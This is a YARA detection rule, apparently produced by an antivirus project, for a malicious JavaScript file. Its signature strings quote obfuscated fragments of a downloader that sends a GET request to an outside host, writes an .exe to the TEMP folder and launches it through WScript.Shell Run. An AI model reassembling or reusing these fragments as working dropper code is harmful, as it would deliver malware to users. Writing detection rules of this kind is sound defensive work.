rule sig_20160401_8105578fd182a2e6fdc673ec222782f1 {
  meta:
    description = "datamaliciousorder - file 20160401_8105578fd182a2e6fdc673ec222782f1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4acc502f781b488f76931c89d2e6ed4c2676eca6bbf6769d38dcf60bfa46c359"

  strings:
    $s1  = "FlsOo[EjaTo](\"G\" + \"ET\", \"http://echo-gs.com/i2osa\", false);" fullword ascii
    $s2  = "function UjCz(OksRen, LsHxa){SkDck = SkDck * 1; return OksRen - LsHxa;};" fullword ascii
    $s3  = "var YrdUr = function AdnBjs() {return WScript[FrbFwf](\"WScript\"+\".Shell\");}(), EuJd = 11;" fullword ascii
    $s4  = "if (FlsOo[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function AtoWj(){return ImrKn + \"\";};" fullword ascii
    $s6  = "function NliNdn() {return YrdUr[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"YcqSoMAaUP.ex\" + \"e\";};" fullword ascii
    $s7  = "function KzpWj() {return ((IbNk == true) && (IbNk == PuIc)) ? 1 : SkDck;};" fullword ascii
    $s8  = "var IbNk = false;" fullword ascii
    $s9  = "var PuIc = false;" fullword ascii
    $s10 = "function ZztOd(VvrCpz){YrdUr[\"R\"+\"un\"](VvrCpz, SkDck, SkDck);};" fullword ascii
    $s11 = "var TpsSb = new this[\"Date\"]();" fullword ascii
    $s12 = "IbNk = true; " fullword ascii
    $s13 = "function XeaDs(){return FrbFwf;};" fullword ascii
    $s14 = "function RtWe()" fullword ascii
    $s15 = "function FaWnt(YwTix) {var TyFl = (1, 2, 3, 4, 5, YwTix); return TyFl;};" fullword ascii
    $s16 = "PuIc = true; " fullword ascii
    $s17 = "return UjCz(RlHcq, XzqDjv);" fullword ascii
    $s18 = "function PddQk(){return 23;};" fullword ascii
    $s19 = "}while (CweXea);" fullword ascii
    $s20 = "var ZaAip = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}